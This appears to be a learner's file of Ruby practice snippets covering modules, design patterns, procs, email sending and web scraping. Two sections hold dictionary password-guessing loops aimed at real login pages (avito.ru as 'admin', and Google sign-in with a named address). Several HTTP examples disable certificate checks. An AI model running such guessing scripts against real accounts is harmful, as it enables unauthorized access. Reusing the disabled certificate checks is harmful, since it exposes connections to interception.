user.send(:hello)
user.send :hello
user.public_send(:hello)
user.public_send :hello
user.method(:hello).call
user.method(:hello).()
user.method(:hello)[]
user.tap(&:hello)
:hello.to_proc.call(user)
eval("user.hello")





---




class Albuquerque
  def initialize actions
    @actions = actions
  end

  def method_missing name, **options
    value = @actions[name]

    pp "#{name}: #{value}"
  end
end



albuquerque = Albuquerque.new cook: 'Walt', take_a_ride: 'Jessie', die: 'Gus'

pp albuquerque



albuquerque.cook
albuquerque.take_a_ride
albuquerque.die



albuquerque.aaa





---




class Something
  def method_missing name
    puts "Calling umknown method #{name}"
  end
end

something = Something.new

pp something.aaa
pp something.sss





---




module Albuquerque
  def initialize actions
    @actions = actions
  end

  def method_missing name
    value = @actions[name]
    puts "if you want to |#{name.upcase}| - you must call |#{value.upcase}|"
  end
end

class LA
  include Albuquerque
end


la = LA.new(cook: 'Walt', take_a_ride: 'Jessie', die: 'Gus')

la.cook
la.take_a_ride
la.die





---




class Albuquerque
  def initialize actions
    @actions = actions
  end

  def method_missing name
    value = @actions[name]
    puts "If you want to #{name}, you must call #{value}"
  end
end


a = Albuquerque.new cook: 'Walt', take_a_ride: 'Jessie', die: 'Gus')

a.cook
a.take_a_ride
a.die





---




module SomethingEx
  def method_missing(method_name, *arguments)
    arguments.each { |argument| pp argument }
  end
end

class Names
  extend SomethingEx
  method_with_custom_name 'Polly', 'Eric', 'John'
end



something = Names.new
pp something






module SomethingIn
  def method_missing(method_name, *arguments)
    arguments.each { |argument| pp argument }
  end
end

class Names
  include SomethingIn
end

something = Names.new
pp something



something.method_with_custom_name 'Polly', 'Eric', 'John'






module SomethingHash
  def method_missing(method_name, **arguments)
    arguments.each do |name, value|
      pp name
    end
  end
end

class Names
  include SomethingHash
end


something = Names.new
pp something



something.method_with_custom_name polly: 'Polly', eric: 'Eric', john: 'John'






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------
module
------


module Circle
  PI = 3.141592653589793

  def Circle.area(radius)
    PI * radius **2
  end

  def Circle.circumference(radius)
    2 * PI * radius
  end
end


circle = 14

circle_area = Circle.area circle
pp circle_area.round 2

circle_circumference = Circle.circumference circle
pp circle_circumference.round 2





---




module Hi
  class Say_Hi
    def self.say_hi
      puts "hi \t#{Time.now}"
    end
    def self.say_bye
      puts "bye \t#{Time.now}"
    end
  end
end


Hi::Say_Hi.say_hi
Hi::Say_Hi.say_bye





---




module Humans
  class Manager
    def say_hi
      pp 'Hi'
    end
  end

  class Hipster
    def say_hi
      pp 'Hiiiii, yo'
    end
  end

  class Jessie_Pincman
    def say_hi
      pp 'Hi, bitch'
    end
  end
end

module Animals
  class Dog
  end

  class Cat
    def run
      pp 'Run'
    end
  end
end


hipster = Humans::Hipster.new
hipster.say_hi

cat = Animals::Cat.new
cat.run





---




module MyNumber
  def self.reverse_integer(number)
    reversed_abs = number.abs.to_s.reverse.to_i
    number.positive? ? reversed_abs : -reversed_abs
  end
end

pp MyNumber::reverse_integer(13)
pp MyNumber::reverse_integer(-123)
pp MyNumber::reverse_integer(8900)





---




module Action
  def jump
    @distance = rand(4) + 2
    puts "I jumped forward #{@distance} feet!"
  end
end

class Rabbit
  include Action
  attr_reader :name

  def initialize name
    @name = name
  end
end

class Cricket
  include Action
  attr_reader :name

  def initialize name
    @name = name
  end
end


peter = Rabbit.new('Peter')
jiminy = Cricket.new('Jiminy')

peter.jump
jiminy.jump





---




module Humans
  class Manager
    def say_hi
      pp 'Hi'
    end
  end

  class Hipster
    def say_hi
      pp 'Hey yo'
    end
  end

  class Jessie_Pinckman
    def say_hi
      pp 'Hi, bitch'
    end
  end
end


hipster = Humans::Hipster.new
hipster.say_hi


module Animals
  class Dog
  end
  class Cat
  end
end


cat = Animals::Cat.new






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

---------------
monkey patching
---------------


class Array
  def how_many?
    length
  end
end

pp %w(one two three).how_many?





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


movies = {
  Memento: 3,
  Primer:  4,
  Ishtar:  1
}

puts "What would you like to do?"
puts "-- Type 'add' to add a movie."
puts "-- Type 'update' to update a movie."
puts "-- Type 'display' to display all movies."
puts "-- Type 'delete' to delete a movie."

choice = gets.chomp.downcase

case choice
when 'add'
  puts "What movie do you want to add?"
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "What's the rating? (Type a number 0 to 4.)"
    rating = gets.chomp
    movies[title.to_sym] = rating.to_i
    puts "#{title} has been added with a rating of #{rating}."
  else
    puts "That movie already exists! Its rating is #{movies[title.to_sym]}."
  end
when 'update'
  puts "What movie do you want to update?"
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "Movie not found!"
  else
    puts "What's the new rating? (Type a number 0 to 4.)"
    rating = gets.chomp
    movies[title.to_sym] = rating.to_i
    puts "#{title} has been updated with new rating of #{rating}."
  end
when 'display'
  movies.each do |movie, rating|
    puts "#{movie}: #{rating}"
  end
when 'delete'
  puts "What movie do you want to delete?"
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "Movie not found!"
  else
    movies.delete(title.to_sym)
    puts "#{title} has been removed."
  end
else
  puts "Sorry, I didn't understand you."
end





---




movies = {
  StarWars:  4.8,
  Divergent: 4.7
}

puts "What would you like to do? "
choice = gets.chomp

case choice
when "add"
  puts "What movie would you like to add? "
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "What rating does the movie have? "
    rating = gets.chomp
    movies[title.to_sym] = rating.to_i
  else
    puts "That movie already exists! Its rating is #{movies[title.to_sym]}."
  end
when "update"
  puts "What movie would you like to update? "
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "That movie does not exist."
  else
    puts "What is the new rating? "
    rating = gets.chomp
    movies[title.to_sym] = rating.to_i
  end
when "display"
  movies.each do |title, rating|
    puts "#{title}: #{rating}"
  end
when "delete"
  puts "What movie would you like to delete? "
  title = gets.chomp

  movies[title.to_sym].nil? ? (puts "That movie does not exist.") : movies.delete(title.to_sym)
else
  puts "Error!"
end





---




def build_query_string query_params
  query_parts = []

  for query_part in query_params.sort
    name, value = query_part
    query_parts << "#{name}=#{value}"
  end

  query_parts.join('&')
end

params = {first: 'one', second: 'two'}

pp build_query_string params





---




def compare_versions version_1, version_2
  major_1, minor_1 = version_1.split('.')
  major_2, minor_2 = version_2.split('.')

  major_compare = major_1[0].to_i <=> major_2[0].to_i
  minor_compare = minor_1[1].to_i <=> minor_2[1].to_i

  major_compare.zero? ? minor_compare : major_compare
end

pp compare_versions '2.3.4', '3.2.4'





---




@hash = {}

def add_person options
  puts 'Already exists' if @hash[options[:name]]
  @hash[options[:name]] = options[:age]
end

def show_hash
  @hash.keys.each do |name|
    age = @hash[name]
    puts "Name: #{name}, age: #{age}"
  end
end

loop do
  print "Enter name: "
  name = gets.strip.capitalize

  if name == ''
    show_hash
    exit
  end

  print 'Enter age: '
  age = gets.to_i

  options = {:name => name, :age => age}
  add_person options
end





---




def parse_orders_input orders_input
  split_1 = orders_input.split(/,/)
  array   = []

  split_1.each do |element|
    split_2 = element.split(/\=/)
    split_3 = split_2[0].split(/_/)

    id    = split_3[1]
    count = split_2[1]

    array_2 = [id, count]
    array.push array_2
  end
  return array
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------
parsing
-------


require 'net/http'
require 'uri'

uri = URI.parse 'https://www.avito.ru/moskva'
response = Net::HTTP.get uri
puts response





---




require 'net/http'
require 'uri'

uri = URI.parse 'https://www.avito.ru/moskva'
response = Net::HTTP.post_form uri, login: 'aaa', password: 'bbb'
puts response.inspect





---




require 'net/http'
require 'uri'

uri = URI.parse 'https://www.avito.ru/moskva'
response = Net::HTTP.post_form(uri, login: 'aaa', password: 'bbb').body
puts response





---




require 'net/http'
require 'uri'

uri = URI.parse 'https://www.avito.ru/moskva'
response = Net::HTTP.post_form(uri, login: 'aaa', password: 'bbb').body
puts response.include? 'config'





---




require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse 'https://www.avito.ru/moskva'
  response = Net::HTTP.post_form(uri, login: 'admin', password: password).body
  response.include? 'config'
end

puts is_wrong_password? 'gor'





---




require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse 'https://www.avito.ru/moskva'
  response = Net::HTTP.post_form(uri, login: 'admin', password: password).body
  response.include? 'denied'
end

input = File.open 'text_files/passwords.txt', 'r'

while (line = input.gets)
  line.strip!

  print "Trying password: #{line} "

  if is_wrong_password? line
    puts '- Error'
  else
    puts '- Found!'
    input.close
    exit
  end
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----------------
decorator pattern
-----------------


class Notifier
  def notify(message)
    puts "send SMS message: #{message}"
  end
end



class BaseDecorator < Notifier
  def initialize(notifier)
    @notifier = notifier
  end

  def notify(message)
    raise NotImplementedError
  end
end



class EmailDecorator < BaseDecorator
  def notify(message)
    @notifier.notify(message)
    puts "send message to email: #{message}"
  end
end

class FacebookDecorator < BaseDecorator
  def notify(message)
    @notifier.notify(message)
    puts "send message to facebook: #{message}"
  end
end

class SlackDecorator < BaseDecorator
  def notify(message)
    @notifier.notify(message)
    puts "send message to slack: #{message}"
  end
end

class VKDecorator < BaseDecorator
  def notify(message)
    @notifier.notify(message)
    puts "send message to VK: #{message}"
  end
end



user_settings = {
  send_to_email:    true,
  send_to_facebook: false,
  send_to_slack:    true,
  send_to_VK:       true
}

chain = Notifier.new

chain = EmailDecorator.new(chain)     if user_settings[:send_to_email]
chain = FacebookDecorator.new(chain)  if user_settings[:send_to_facebook]
chain = SlackDecorator.new(chain)     if user_settings[:send_to_slack]
chain = VKDecorator.new(chain)        if user_settings[:send_to_VK]

chain.notify('hello')





---




class ArticleDecorator < Draper::Decorator
  deleagate_all

  def publication_status
    if published?
      "Published at #{published_at}"
    else
      'Unpublished'
    end
  end

  def published_at
    object.published_at.strftime('%A, %B, %e')
  end
end




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----------------
pattern strategy
----------------


class Navigator
  attr_reader :type

  def initialize type=:car
    @type = type
  end

  def build_route *attributes
    points = []

    if @type == :car
      points << { lat: 0, lon: 0 }
      points << { lat: 1, lon: 1 }
    elsif @type == :walk
      points << { lat: 10, lon: 10 }
      points << { lat: 21, lon: 21 }
    else
      points << { lat: 30, lon: 30 }
      points << { lat: 31, lon: 31 }
    end
    return points
  end
end

bus_nav = Navigator.new(:bus).build_route :a, :b
pp bus_nav

puts

pp Navigator.new(:bus).type

puts

car_nav = Navigator.new
pp car_nav

puts

pp car_nav.build_route :c, :d
pp car_nav.build_route :c
pp car_nav.build_route :a, :b, :c, :d, :e

puts

walk_nav = Navigator.new(:walk).build_route :a, :b

pp walk_nav





---




class Strategy
  def call a, b; end
end

class Car < Strategy
  def initialize; end

  def call a, b
    points = []
    points << { lat: 0, lon: 0 }
    points << { lat: 1, lon: 1 }
    return points
  end
end

class Walk
  def initialize; end

  def call a, b
    points = []
    points << { lat: 10, lon: 10 }
    points << { lat: 21, lon: 21 }
    return points
  end
end

class Bus
  def initialize; end

  def call a, b
    points = []
    points << { lat: 30, lon: 30 }
    points << { lat: 31, lon: 31 }
    return points
  end
end

class Plane
  def initialize; end

  def call a, b
    points = []
    points << { lat: 50, lon: 50 }
    points << { lat: 51, lon: 51 }
    return points
  end
end



class Navigator
  attr_accessor :route_strategy

  def initialize type=:car
    @type = type
  end

  def build_route a, b
    points = []
    points = route_strategy.new.call a, b
    points
  end
end

pp navigator = Navigator.new

pp navigator.route_strategy = Walk
pp navigator.build_route :a, :b



pp navigator.route_strategy = Car
pp navigator.build_route :a, :b



pp navigator.route_strategy = Bus
pp navigator.build_route :a, :b



pp navigator.route_strategy = Plane
pp navigator.build_route :a, :b





---




class Report
  def generate_report!
    retrieve_financial_data
    format_report
    send_to_stakeholders
  end

  private

  def retrieve_financial_data
    # Grab relevant data from our database
  end

  def format_report
    # Take our financial data and arrange it in HTML format
  end

  def send_to_stakeholders
    # Email this report to interested parties
  end
end





---




class ReportTemplate
  def generate_report!
    retrieve_financial_data
    format_report
    send_to_stakeholders
    after_send_hook
  end

  private

  def retrieve_financial_data
    # Grab relevant data from our database
  end

  def format_report
    raise NotImplementedError
  end

  def send_to_stakeholders
    # Email this report to interested parties
  end

  def after_send_hook
  end
end


class ReportHtml < ReportTemplate
  def format_report
    # something
  end
end


class ReportText < ReportTemplate
  def format_report
    # something
  end

  def after_send_hook
    # something
  end
end

def send_report(report_class)
  report_class.generate_report!
end

send_report(ReportText)





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----------------------------
pony, mail sending with pony
----------------------------


require 'pony'
require 'io/console'

my_mail = 'G9160832993@yandex.ru'

print "Enter your #{my_mail} password for message send: "
password = STDIN.noecho(&:gets).chomp

print "Whom send the message? (enter email): "
send_to = STDIN.gets.chomp

print "Enter message body: "
body = STDIN.gets.chomp

Pony.mail(
  {
    subject: 'hi from Ruby',
    body:    body,
    to:      send_to,
    from:    my_mail,

    via: :smtp,
    via_options: {
      address:              'smtp.yandex.ru',
      port:                 '465',
      enable_starttls_auto: true,
      tls:                  true,
      user_name:            my_mail,
      password:             password,
      authentication:       :plain,
    }
  }
)

puts 'The message successfully sended!'





---





require 'pony'
require 'io/console'

my_mail = 'G9160832993@yandex.ru'

print "Enter your #{my_mail} password for message send: "
password = STDIN.noecho(&:gets).chomp

print 'Whom send the message? (enter email): '
send_to = STDIN.gets.chomp

print 'Enter message body: '
body = STDIN.gets.chomp

Pony.mail({
    subject: 'hi from Ruby',
    body:    body,
    to:      send_to,
    from:    my_mail,

    via: :smtp,
    via_options: {
      address:              'smtp.yandex.ru',
      port:                 '465',
      enable_starttls_auto: true,
      tls:                  true,
      user_name:            my_mail,
      password:             password,
      authentication:       :plain,
    }
  }
)

puts 'The message successfully sended'





---




require 'pony'
require 'io/console'

my_mail = '7495500@gmail.com'

puts "Enter email #{my_mail} password for send: "
password = STDIN.noecho(&:gets).chomp

puts 'Whom send messege?'
send_to = STDIN.gets.chomp

puts "Input text: "
body = STDIN.gets.chomp

Pony.mail(
  {
    subject: 'Hey from Ruby',
    body:    body,
    to:      send_to,
    from:    my_mail,

    via: :smtp,
    via_options: {
      address:              'smtp.gmail.com',
      port:                 '587',
      enable_starttls_auto: true,
      user_name:            my_mail,
      password:             password,
      authentication:       :plain,
    }
  }
)

puts 'Mail sended'




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----
prime
-----


def prime(number)
  puts "That's not an integer." unless number.is_a? Integer
  is_prime = true

  for num in 2..number - 1
    is_prime = false if number % num == 0
  end

  is_prime ? (puts "#{number} is prime!") : (puts "#{number} is not prime.")
end

prime(2)
prime(9)
prime(11)
prime(51)
prime(97)





---




require 'prime'

def first_number_primes number
  return 'number must be an integer.' unless number.is_a? Integer
  return 'number must be greater than 0.' if number <= 0
  return Prime.first number
end

pp first_number_primes(10)







----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----
proc
----


def apply_blocks(data, blocks)
  blocks.reduce(data) { |acc, block| block.call(acc) }
end

plus_one = proc { |number| number + 1 }
doble =    proc { |number| number * 2 }

pp apply_blocks(5, [plus_one, doble])





---




fibs = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55]

double = Proc.new { |number| number * 2 }
doubled_fibs = fibs.collect(&double)

pp doubled_fibs





---




multiples_of_3 = Proc.new do |number|
  number % 3 == 0
end

pp (1..25).to_a.select(&multiples_of_3)





---




floats = [1.2, 3.45, 0.91, 7.727, 11.42, 482.911]

round_down = Proc.new { |float| float.floor }
ints = floats.collect(&round_down)

pp ints





---




group_1 = [4.1, 5.5, 3.2, 3.3, 6.1, 3.9, 4.7]
group_2 = [7.0, 3.8, 6.2, 6.1, 4.4, 4.9, 3.0]
group_3 = [5.5, 5.1, 3.9, 4.3, 4.9, 3.2, 3.2]

over_4_feet = Proc.new { |height| height >= 4 }

can_ride_1 = group_1.select(&over_4_feet)
can_ride_2 = group_2.select(&over_4_feet)
can_ride_3 = group_3.select(&over_4_feet)

pp can_ride_1
pp can_ride_2
pp can_ride_3





---




numbers_array = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

strings_array = numbers_array.map(&:to_s)

pp strings_array





---




ages = [23, 101, 7, 104, 11, 94, 100, 121, 101, 70, 44]

under_100 = Proc.new { |number| number < 45 }
youngsters = ages.select(&under_100)

pp youngsters





---




def greeter
  yield
end

phrase = Proc.new { pp 'hey there' }
greeter(&phrase)




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------
ARGV, STDOUT, STDIN
-------------------


name = ARGV[0]

print "Enter your name: "
name = STDIN.gets.strip.capitalize

while name == ""
  print "Enter your name: "
  name = STDIN.gets.strip.capitalize
end

puts "Hey #{name}, answer the questions..."
sleep 0.3

questions = [
  "1. Have you ever searched your partner's gadgets for evidence of infidelity?",
  "2. You don't particularly like the fact that your partner is communicating with the opposite sex (without flirting). Will you tell him / her about this?",
  "3. Could you get into a fight or at least just push an overly Intrusive opponent or rival?",
  "4. At the festival, your couple was invited to a slow dance. How will you react?",
  "5. This is the third time he/she has seen friends in a week, although you have never even gone out for a walk together. How will you behave?",
  "6. How often do you call your partner to check where they are and with whom?",
  "7. He/she affectionately called(a) my colleague Anya/by Dima. Your reaction?",
  "8. Someone called your partner in the middle of the night. Your thoughts?",
  "9. How will you behave if your couple suddenly starts flirting with someone else?",
  "10. How do you feel about your partner's past?",
  "11. Your partner stayed at work for an hour or two all week, arguing that it was necessary to finish an important project. What do you think about this?",
  "12. Your couple is invited to a hen / stag party, where 100% will be a Striptease. Your reaction?",
  "13. Did you purposefully introduce your friends to him / her?",
  "14. Your best friend refused to go to the movies with you. And on the day of the movie premiere, you saw him / her with another person. Your reaction?",
  "15. Do you believe in friendship between men and women?",
  "16. Have you ever made a public scandal out of jealousy?",
  "17. Have you ever been told that you are very jealous?",
  "18. You seriously suspect him / her of cheating. How will he behave next?",
  "19. Have you been cheated on in the past (not necessarily by your current partner)?",
  "20. How would you react if your partner expressed a desire to communicate with their exes?"
]

results = [
  "Are you jealous",
  "You're not jealous",
  "You asshole"
]

yes_answers = 0

questions.each do |item|
  puts "\n#{item}"
  user_input = nil

  while user_input != "Y" && user_input != "N" && user_input != "W"
    print "Enter your choice (Y)es, (N)o or (W)hatever: "
    user_input = STDIN.gets.strip.capitalize
  end
  yes_answers += 1 if user_input == "Y"
end

puts "\n#{name}"
puts "Your answers score is: #{yes_answers}"

if yes_answers >= 10
  puts results[0]
elsif yes_answers < 10 && yes_answers > 0
  puts results[1]
elsif yes_answers <= 0
  puts results[2]
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----
rack
----


require 'rackup'

Rack::Handler::Thin.run lambda { |env| [ 200, { 'Content-Type': 'text/plain' }, [ "Hello, the time is: #{Time.now}" ]] }





---




require 'rackup'

class MyApp
  def call(_env)
    [200, {'Content-Type' => 'text/html'}, ['Hello']]
  end
end

Rackup::Handler::WEBrick.run MyApp.new, :Port => 3000





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

---------------------------
work with api, parsing, web
---------------------------


require 'open-uri'
require 'nokogiri'
require 'net/http'
require 'net/https'

uri = URI('https://httpbin.org')
get_path = 'get'
post_path = 'post'

Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https', verify_mode: OpenSSL::SSL::VERIFY_NONE) do |http|
  request  = Net::HTTP::Get.new uri.request_uri + get_path
  response = http.request request

  puts response.body

  # cookie = response.response['set-cookie'].split('; ')[0]

  params = {
    test: true,
    hello: 'world'
  }

  request = Net::HTTP::Post.new uri.request_uri + post_path
  request.body = URI.encode_www_form(params)
  # request['Cookie'] = cookie

  response = http.request request

  puts response.body

  response.code == '200'
end

# Пример с получением страницы
hostname = 'https://example.com'

uri = URI(hostname)
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = uri.scheme == 'https'
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

request  = Net::HTTP::Get.new uri
response = http.request request

# Если нам нужно получить куки со страницы
cookie = response.response['set-cookie'].split('; ')[0]

params = {
  'name': "Jon",
  'email': "jon@example.com"
  'token': token
}

request = Net::HTTP::Post.new URI.join(hostname, '/register')
request.body = URI.encode_www_form(params)
# Добавляем куки в запрос
request['Cookie'] = cookie

response = http.request request

# При успешной отправке формы как правило
response.code == '302'

# Пример скрапинга данных со страницы
example_uri = URI('https://example.com/')
response    = Net::HTTP.get_response(example_uri)

html = Nokogiri::HTML(response.body)
# Поиск нужного тега с помощью селекторов
token_tag = html.at('input[@name="token"]')
puts token_tag['value']






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



print 'Thtring, pleathe: '
input = gets.chomp.downcase!

if user_input.include? 's'
  user_input.gsub!(/s/, 'th')
else
  puts 'Nothing to do here'
end

puts "Your string is: #{input}"





---




def invert_case string
  result = ''

  string.each_char do |char|
    new_char = if char.upcase == char
      char.downcase
    else
      char.upcase
    end

    result = "#{result}#{new_char}"
  end
  result
end


pp invert_case('Hello, World!')
pp invert_case('I loVe JS')





---




def reverse string
  result = ''
  string.each_char do |char|
    result = "#{char}#{result}"
  end
  result
end


pp reverse('gor')





---




string = 'Ernest Hemingway, in full Ernest Miller Hemingway, (born July 21, 1899, 
Cicero [now in Oak Park], Illinois, U.S.—died July 2, 1961, Ketchum, Idaho), 
American novelist and short-story writer, awarded the Nobel Prize for Literature 
in 1954. He was noted both for the intense masculinity of his writing and for his 
adventurous and widely publicized life. His succinct and lucid prose style exerted a 
powerful influence on American and British fiction in the 20th century.'

pp string.split(/ /).reverse.join(' ')





---




def get_men_count_by_year users
  men = users.filter { |user| user[:gender] == 'male' }
  years = men.map { |user| user[:birthday][0, 4] }

  years.reduce({}) do |acc, year|
    acc[year] ||= 0
    acc[year] += 1
    acc
  end
end

users = [
  { name: 'Bronn',   gender: 'male',   birthday: '1973-03-23' },
  { name: 'Reigar',  gender: 'male',   birthday: '1973-11-03' },
  { name: 'Eiegon',  gender: 'male',   birthday: '1963-11-03' },
  { name: 'Sansa',   gender: 'female', birthday: '2012-11-03' },
  { name: 'Jon',     gender: 'male',   birthday: '1980-11-03' },
  { name: 'Robb',    gender: 'male',   birthday: '1980-05-14' },
  { name: 'Tisha',   gender: 'female', birthday: '2012-11-03' },
  { name: 'Rick',    gender: 'male',   birthday: '2012-11-03' },
  { name: 'Joffrey', gender: 'male',   birthday: '1999-11-03' },
  { name: 'Edd',     gender: 'male',   birthday: '1973-11-03' }
]


pp get_men_count_by_year(users)





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----------
send method
-----------


def value_upcaser params
  params.each do |name, value|
    puts "#{name}: #{value.upcase}"
  end
end

send :value_upcaser, nick: 'Nick', mike: 'Mike', eric: 'Alice'





---




class Something
  attr_accessor :first_attribute, :second_attribute

  def initialize params
    params.each do |name, value|
      send "#{name}=", value
    end
  end
end

something = Something.new first_attribute: 1, second_attribute: 2

pp something.first_attribute
pp something.second_attribute





---




class Something
  attr_accessor :name, :age, :country

  def initialize hash
    hash.each do |key, value|
      send("#{key}=", value)
    end
  end
end



something = Something.new name: 'Mike', age: 60, country: 'USA'

pp something
pp something.name
pp something.age
pp something.country



something.name = 'Steve'
pp something





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----------------
shop cart method
----------------


hash = {}

loop do
  print 'Enter product id: '
  id = gets.chomp

  print 'Enter amount (how much items you want to order): '
  amount = gets.chomp.to_i

  product_id = hash[id].to_i
  product_id += amount
  hash[id] = product_id

  pp hash

  puts

  total = 0
  hash.each do |name, value|
    total = total + value
  end

  puts "Total items in cart: #{total}"
  puts
end





---




orders = 'product_1=4,product_2=1,product_3=1,'

def parse_orders_line orders_line
  split_1 = orders_line.split(/\,/)
  array   = []

  split_1.each do |product|
    split_2 = product.split(/\=/)
    split_3 = split_2[0].split(/\_/)

    id    = split_3[1]
    count = split_2[1]

    array_2 = [id, count]

    array.push array_2
  end
  return array
end

pp parse_orders_line(orders)





---




orders = 'product_1=4,product_2=1,product_3=1,'

split_1 = orders.split(/,/)

pp split_1

puts

split_1.each do |product|
  split_2 = product.split(/=/)

  pp split_2
end

puts

split_1.each do |product|
  split_2 = product.split(/=/)
  split_3 = split_2[0].split(/_/)

  pp split_3
end

puts

split_1.each do |product|
  split_2 = product.split(/=/)
  split_3 = split_2[0].split(/_/)

  name  = split_3[1]
  count = split_2[1]

  pp "Product name: #{name} Product count : #{count}"
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

---------
singleton
---------


require './logger'

Logger.instance.log_something 'Blabla'





require 'singleton'

class Logger
  include Singleton

  def initialize
    @f = File.open 'log.txt', 'a'
  end

  def log_something what
    @f.puts what
    @f.flash
  end
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----------------------------------
site parse, parsing, nokigiri, json
-----------------------------------


require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse 'https://accounts.google.com/signin'
  response = Net::HTTP.post_form(uri, login: '7495500@gmail.com', password: password).body
  puts response.include? "logo"
end

input = File.open 'text_files/passwords.txt', 'r'

while (line = input.gets)
  line.strip!

  print "Trying password #{line} - "

  if is_wrong_password? line
    pp 'Error'
    input.close
  end
end





---




require 'open-uri'
require 'nokogiri'
require 'json'

url = 'https://hh.ru/search/vacancy?area=1&employment=full&schedule=remote&search_field=name&search_field=company_name&search_field=description&text=&no_magic=true&L_save_area=true&items_on_page=50&hhtmFrom=vacancy_search_list'

html      = URI.open(url)
doc       = Nokogiri::HTML(html)
vacations = []

doc.css('.serp-item').each do |showing|
  title       = showing.css('.serp-item__title').text
  employer    = showing.at('.vacancy-serp-item-company').text
  salary      = showing.css('.bloko-header-section-3').text
  location    = showing.css('.bloko-text').text
  description = showing.css('.g-user-content').text
  link        = showing.css('.vacancy-serp-actions').to_s.split(' ').to_a[7]

  vacations.push(
    title:       title,
    employer:    employer,
    salary:      salary,
    location:    location,
    description: description,
    link:        link
  )
end


puts vacations
puts JSON.pretty_generate(vacations)







----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


array = [ 0, 1, 2 ]
pp array.size

puts


big = 0
array.each_with_index do |element, index|
  index += 1
  big = index
end

pp big





---




def alphabetize(array, rev=false)
  rev ? array.sort { |item_1, item_2| item_2 <=> item_1 } : array.sort { |item_1, item_2| item_1 <=> item_2 }
end

books = %w[ Heart of Darkness Code Complete The Lorax The Prophet Absalom, Absalom! ]

puts "A-Z: #{alphabetize(books)}"
puts "Z-A: #{alphabetize(books, true)}"





---




books = [
  'Charlie and the Chocolate Factory',
  'War and Peace',
  'Utopia',
  'A Brief History of Time',
  'A Wrinkle in Time'
]

sort_by_asc  = books.sort! { |firstBook, secondBook| firstBook <=> secondBook }
sort_by_desc = books.sort! { |firstBook, secondBook| secondBook <=> firstBook }

pp sort_by_asc
pp sort_by_desc





---




def merge_all(hash, *hashes)
  hash.merge(*hashes)
end

hash_1 = { key_1: 'value_1' }
hash_2 = { key_2: 'value_2' }

puts merge_all(hash_1, hash_2)





---




pp ({key: 'value'}).eql?({'key': 'value'})
pp ({key: 'value'}).eql?({key: 'value'})





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----
tally
-----


list = %w[ a b b a c d d d e ]

pp list.group_by { |value| value }.map { |name, value| [name, value.size] }.to_h
pp list.each_with_object(Hash.new(0)) { |value, hash| hash[value] += 1 }





hashes = [{name: 'Meagan' }, { name: 'Meagan' }, { name: 'Lauren' }]

pp hashes.group_by(&:itself).map { |name, value| name.merge(count: value.length)}





list = %w[ a b b a c d d d e ]
pp list.tally





the_hashes = [{name: 'Meagan' }, { name: 'Meagan' }, { name: 'Lauren' }]

pp the_hashes.tally
pp the_hashes.tally.map { |name, value| name.merge({count: value}) }





---




pp [1, 1, 2].tally
pp [1, 2, 2, 3].tally






pp [1, 1, 2].map(&:even?).tally






pp %w(foo foo bar foo baz foo).tally
pp %w(foo foo bar foo baz foo).map { |word| word[0] }.tally






list = [1, 2, 3]

pp list.group_by { |value| value.to_s }.transform_values(&:size)
pp list.group_by { |value| value.to_s }.map { |name, value| [name, value.size] }.to_h
pp list.group_by { |value| value.to_s }.to_h { |name, value| [name, value.size] }

pp list.each_with_object(Hash.new(0)) { |value, hash| hash[value.to_s] += 1 }



module Enumerable
  def tally_by(&function)
    function ||= -> value { value }

    each_with_object(Hash.new(0)) do |value, hash|
      hash[function.call(value)] += 1
    end
  end

  def tally
    tally_by(&:itself)
  end
end





---




pp ['a', 'b', 'c', 'b'].tally





order_one = %i{ pen pencil eraser sharpener pen pen }
order_two = %i{ sharpener eraser eraser eraser eraser sharpener sharpener sharpener sharpener }

